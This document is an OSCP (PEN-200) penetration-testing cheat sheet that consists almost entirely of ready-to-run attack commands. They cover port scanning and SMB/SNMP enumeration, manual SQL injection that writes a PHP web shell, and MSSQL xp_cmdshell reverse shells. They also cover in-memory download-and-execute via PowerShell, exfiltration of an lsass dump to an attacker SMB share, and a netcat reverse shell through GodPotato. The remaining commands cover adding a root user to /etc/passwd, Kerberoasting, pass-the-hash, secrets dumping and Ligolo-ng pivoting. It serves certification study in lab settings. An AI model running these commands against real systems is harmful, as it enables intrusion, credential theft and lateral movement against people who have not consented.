# OSCP (PEN-200) — Master Command & Exploitation Cheat Sheet

```text
========================================================================================
                     OSCP 24-HOUR ATTACK METHODOLOGY PIPELINE
========================================================================================

  [ 1. Port & Service Recon ] ──► rustscan / nmap -p- -sC -sV / autorecon (TCP & UDP)
               │
               ▼
  [ 2. Deep Service Enumeration ]
       ├── SMB (139/445): netexec smb, smbclient -N, enum4linux-ng, rpcclient
       ├── Web (80/443/8080): feroxbuster, ffuf (vhost & dir), nikto, parameter fuzzing
       ├── Kerberos/LDAP (88/389): kerbrute, ldapsearch, bloodhound-python
       └── SNMP (UDP 161): snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.77.1.2.25
               │
               ▼
  [ 3. Initial Foothold & Shell Stabilization ]
       ├── Web RCE: SQLi -> INTO OUTFILE, LFI -> Log Poisoning / Filter Chain, File Upload
       ├── Public Exploits: searchsploit -m <ID>, fix hardcoded IPs/Offsets/Payloads
       └── Shell Upgrade: python3 pty -> stty raw -echo; fg -> export TERM=xterm
               │
               ▼
  [ 4. Local Privilege Escalation (Local -> Root / SYSTEM) ]
       ├── Linux: sudo -l, find SUID, getcap -r /, pspy64 (cron), LinPEAS
       └── Windows: whoami /priv (GodPotato/PrintSpoofer), WinPEAS, Service ACLs
               │
               ▼
  [ 5. Post-Exploitation, Credential Harvesting & Pivoting ]
       ├── Dump Secrets: secretsdump.py, lsassy, Mimikatz, Lazagne, browser/config files
       ├── Network Discovery: ip a, ip route, arp -a, netstat -ano
       └── Tunneling: Ligolo-ng (TUN interface) or Chisel (Reverse SOCKS5 + Proxychains)
               │
               ▼
  [ 6. Active Directory Lateral Movement & Domain Dominance ]
       ├── Kerberoasting / AS-REP Roasting -> Hashcat (-m 13100 / -m 18200)
       ├── ACL Abuse: GenericAll / WriteDacl / ForceChangePassword / Shadow Credentials
       └── Domain Admin: Pass-the-Hash / Overpass-the-Hash / Silver-Golden Ticket / DCSync
```

---

## 1. Network & Service Enumeration

### 1.1 Fast All-Port TCP & Top UDP Scanning
```bash
# Step 1: Fast all-port TCP sweep
sudo nmap -p- --min-rate 5000 -T4 -n -Pn -oN tcp_all.txt 192.168.50.10

# Step 2: Detailed version and default script scan on discovered ports
PORTS=$(grep ^[0-9] tcp_all.txt | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
sudo nmap -p$PORTS -sC -sV -O -n -Pn -oN tcp_detailed.txt 192.168.50.10

# Step 3: Top 100 UDP scan (Never skip UDP! SNMP 161, TFTP 69, IKE 500)
sudo nmap -sU --top-ports 100 --min-rate 1000 -n -Pn -oN udp_top100.txt 192.168.50.10
```

### 1.2 Web Directory, File & Virtual Host Fuzzing
```bash
# Recursive directory & file discovery with feroxbuster
feroxbuster -u http://target.local -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,bak,zip,conf,inc -t 50 -o ferox.txt

# Virtual Host (Subdomain) fuzzing with ffuf (Filter out baseline word/size count)
ffuf -u http://192.168.50.10 -H "Host: FUZZ.target.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 4215
```

### 1.3 SMB, RPC & NetBIOS Enumeration (Ports 135, 139, 445)
```bash
# Null session & guest share enumeration with NetExec (formerly CrackMapExec)
nxc smb 192.168.50.10 -u '' -p '' --shares
nxc smb 192.168.50.10 -u 'guest' -p '' --shares
nxc smb 192.168.50.10 -u '' -p '' --users --rid-brute

# Interactive SMB share inspection & recursive download
smbclient -N -L //192.168.50.10
smbclient //192.168.50.10/ShareName -N
# Inside smbclient to download everything recursively:
recurse ON
prompt OFF
mget *

# RPC null session enumeration
rpcclient -U "" -N 192.168.50.10
# Inside rpcclient: enumdomusers, enumdomgroups, querydispinfo, lookupnames
```

### 1.4 SNMP Enumeration (UDP Port 161)
```bash
# Brute-force community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.50.10

# Walk entire MIB tree (including running processes & command-line parameters!)
snmpwalk -v2c -c public 192.168.50.10 1.3.6.1.2.1.25.4.2.1.2  # Running processes
snmpwalk -v2c -c public 192.168.50.10 1.3.6.1.2.1.25.4.2.1.4  # Process arguments (often leaks passwords!)
snmpwalk -v2c -c public 192.168.50.10 1.3.6.1.4.1.77.1.2.25   # Windows user accounts
```

---

## 2. Shell Stabilization & File Transfers

### 2.1 Upgrading a Dumb Reverse Shell to Full Interactive TTY (Linux)
```bash
# 1. On target shell: spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 2. Press Ctrl+Z to background shell
# 3. On Kali attacker host:
stty raw -echo; fg
# 4. Inside target shell:
reset xterm
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 50 columns 180
```

### 2.2 Living-Off-The-Land File Transfers (Windows & Linux)
```bash
# Kali Attacker HTTP Server (Port 80)
python3 -m http.server 80

# Kali Attacker SMB Server (Supports authentication for modern Windows blocks)
impacket-smbserver share . -smb2support -username kali -password kali

# Windows Download Methods:
certutil.exe -urlcache -split -f http://192.168.45.5/winpeas.exe C:\Windows\Temp\wp.exe
iwr -uri http://192.168.45.5/nc.exe -OutFile C:\Windows\Temp\nc.exe
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.45.5/shell.exe','C:\Temp\shell.exe')"
# Execute directly in memory without touching disk:
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.5/PowerView.ps1')"

# Windows Upload back to Kali (via SMB):
net use Z: \\192.168.45.5\share /user:kali kali
copy C:\Users\Administrator\AppData\Local\Temp\lsass.dmp Z:\
```

---

## 3. Manual SQL Injection (Zero `sqlmap` Allowed!)

### 3.1 UNION-Based SQL Injection (MySQL / MariaDB)
```sql
-- 1. Determine column count
' ORDER BY 1-- -
' ORDER BY 4-- -

-- 2. Identify displayable string columns
' UNION SELECT 1,2,3,4-- -

-- 3. Extract database version, current user, and schema
' UNION SELECT 1,@@version,user(),database()-- -

-- 4. Enumerate tables and columns
' UNION SELECT 1,table_name,column_name,4 FROM information_schema.columns WHERE table_schema=database()-- -

-- 5. Read local files via LOAD_FILE() (Requires FILE privilege)
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -

-- 6. Write Web Shell via INTO OUTFILE (Requires FILE privilege & secure_file_priv="")
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3,4 INTO OUTFILE '/var/www/html/shell.php'-- -
```

### 3.2 MSSQL `xp_cmdshell` Activation & Command Execution
```sql
-- Enable advanced options and activate xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
-- Execute OS commands
'; EXEC xp_cmdshell 'powershell -e <BASE64_REVERSE_SHELL>';--
-- Capture Net-NTLMv2 hash via Responder / impacket-smbserver:
'; EXEC master..xp_dirtree '\\192.168.45.5\share';--
```

---

## 4. Linux Privilege Escalation Quick Reference

- **Sudo Rights (`sudo -l`):** Cross-reference every allowed binary on [GTFOBins](https://gtfobins.github.io/). Check `env_keep+=LD_PRELOAD`.
- **SUID / SGID Binaries:**
  ```bash
  find / -perm -4000 -type f 2>/dev/null
  ```
- **Linux Capabilities:**
  ```bash
  getcap -r / 2>/dev/null
  # If python3 has cap_setuid+ep:
  /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  ```
- **Cron Jobs & Hidden Background Processes:**
  - Inspect `/etc/crontab`, `/etc/cron.d/*`, `/var/spool/cron/crontabs/*`.
  - Run **`pspy64`** to observe root commands executing on intervals without root read permissions!
- **Writable `/etc/passwd`:**
  ```bash
  openssl passwd -6 -salt xyz Password123!
  echo 'hacker:$6$xyz$...:0:0:root:/root:/bin/bash' >> /etc/passwd
  su hacker
  ```

---

## 5. Windows Privilege Escalation Quick Reference

- **Token Privileges (`whoami /priv`):**
  - `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` $\rightarrow$ **PrintSpoofer64.exe** or **GodPotato**:
    ```cmd
    GodPotato-NET4.exe -cmd "C:\Temp\nc.exe 192.168.45.5 443 -e cmd.exe"
    PrintSpoofer64.exe -i -c "cmd.exe"
    ```
  - `SeBackupPrivilege` $\rightarrow$ Dump `SAM` and `SYSTEM` hives via `reg save HKLM\SAM sam.bak` & `reg save HKLM\SYSTEM sys.bak`.
  - `SeRestorePrivilege` or `SeTakeOwnershipPrivilege` $\rightarrow$ Overwrite `utilman.exe` or service binaries.
- **Unquoted Service Paths & Weak Service Permissions:**
  ```cmd
  wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
  accesschk.exe /accepteula -uwcqv "Users" *
  sc config VulnService binPath= "C:\Temp\reverse.exe"
  net stop VulnService && net start VulnService
  ```

---

## 6. Active Directory Attack Matrix

- **Kerberoasting (Service Accounts with SPNs):**
  ```bash
  impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.local/john:Password123 -outputfile kerberoast.txt
  hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
  ```
- **AS-REP Roasting (Accounts with `DONT_REQ_PREAUTH`):**
  ```bash
  impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip 192.168.50.70
  hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
  ```
- **BloodHound Data Collection:**
  ```bash
  bloodhound-python -u 'john' -p 'Password123' -ns 192.168.50.70 -d corp.local -c All --zip
  ```
- **Pass-the-Hash (PtH) & Secrets Dumping:**
  ```bash
  evil-winrm -i 192.168.50.70 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
  impacket-psexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.50.70
  impacket-secretsdump -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@192.168.50.70
  ```

---

## 7. Network Pivoting with Ligolo-ng (Gold Standard)

```bash
# 1. On Kali Attacker: Create TUN interface & start proxy server
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# 2. On Compromised Pivot Host: Connect agent back to Kali
./agent -connect 192.168.45.5:11601 -ignore-cert

# 3. In Kali Ligolo Console: Select session, add route to internal subnet (e.g. 172.16.10.0/24), and start tunnel
ligolo-ng >> session
[Agent] >> autoroute
# Or manually on Kali: sudo ip route add 172.16.10.0/24 dev ligolo
[Agent] >> start

# 4. Reverse Shell / File Transfer Port Forwarding via Ligolo Listener:
[Agent] >> listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```
